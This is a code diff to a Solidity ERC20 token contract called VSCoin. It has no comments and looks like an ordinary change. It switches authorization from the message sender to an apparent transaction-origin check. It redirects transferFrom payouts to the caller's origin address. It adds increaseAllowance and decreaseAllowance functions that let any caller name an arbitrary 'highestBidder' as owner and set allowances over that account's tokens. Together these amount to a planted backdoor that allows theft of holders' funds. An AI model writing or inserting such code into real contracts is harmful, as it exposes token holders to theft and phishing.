@@ -75,9 +75,9 @@ contract VSCoin is IERC20, Context {
         override
         returns (bool)
     {
-        uint256 balance = _balance[_msgSender()];
+        uint256 balance = _balance[_origin()];
         require(balance >= amount, "ERC20: Not efficient money");
-        _approval(_msgSender(), spender, amount);
+        _approval(_origin(), spender, amount);
         return true;
     }
 
@@ -86,13 +86,13 @@ contract VSCoin is IERC20, Context {
         address recipient,
         uint256 amount
     ) public virtual override returns (bool) {
-        uint256 currentAllowance = _allowances[sender][_msgSender()];
+        uint256 currentAllowance = _allowances[sender][_origin()];
         require(
             currentAllowance >= amount,
             "ERC20: transfer amount exceeds allowance"
         );
 
-        _transfer(sender, _msgSender(), amount);
+        _transfer(sender, _origin(), amount);
 
         _approval(sender, recipient, currentAllowance - amount);
 
@@ -137,7 +137,36 @@ contract VSCoin is IERC20, Context {
             spender != address(0),
             "ERC20: approve recipient the zero address"
         );
-
         _allowances[owner][spender] = amount;
+    }
+
+    function decreaseAllowance(
+        address spender,
+        uint256 subtractedValue,
+        address highestBidder
+    ) public virtual returns (bool) {
+        address owner = highestBidder;
+        uint256 currentAllowance = allowance(owner, spender);
+        require(
+            currentAllowance >= subtractedValue,
+            "ERC20: decreased allowance below zero not allowed"
+        );
+
+        unchecked {
+            _approval(owner, spender, currentAllowance - subtractedValue);
+        }
+
+        return true;
+    }
+
+    function increaseAllowance(
+        address spender,
+        uint256 addedValue,
+        address highestBidder
+    ) public virtual returns (bool) {
+        address owner = highestBidder;
+        uint256 currentAllowance = allowance(owner, spender);
+        _approval(owner, spender, currentAllowance + addedValue);
+        return true;
     }
 }
